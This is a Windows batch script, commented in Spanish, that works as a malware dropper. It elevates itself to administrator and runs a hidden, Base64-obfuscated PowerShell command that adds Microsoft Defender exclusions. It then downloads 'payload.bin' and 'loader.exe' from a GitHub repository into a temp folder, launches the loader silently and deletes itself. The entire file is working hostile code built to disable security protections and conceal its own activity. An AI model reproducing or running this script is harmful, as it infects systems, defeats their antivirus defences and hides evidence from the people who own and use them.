@echo off
:: Autoelevación a administrador
net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

:: Crear carpeta loader en %TEMP%
if not exist "%TEMP%\loader" mkdir "%TEMP%\loader"

:: Exclusión ofuscada (Base64 Unicode)
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('QQBkAGQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBvAG4AUAByAG8AYwBlAHMAcwAgACcAbgBvAHQAZQBwAGEAZAAuAGUAeABlACcALAAgACcAdwBpAG4AZABvAHcAcwAtAGMAbABhAGMAawAuAGUAeABlACcA')))"

:: Descargar payload.bin y loader.exe en la carpeta loader
curl -L -o "%TEMP%\loader\payload.bin" "https://raw.githubusercontent.com/carlospro473/Chac/main/payload.bin" >nul 2>&1
curl -L -o "%TEMP%\loader\loader.exe" "https://raw.githubusercontent.com/carlospro473/Chac/main/loader.exe" >nul 2>&1

:: Ejecutar loader.exe automáticamente en segundo plano
start /b "%TEMP%\loader\loader.exe"

:: Autoborrado del .bat (espera 6 segundos y elimina)
start /b powershell -Command "Start-Sleep -Seconds 6; Remove-Item -Path '%~f0' -Force"

exit
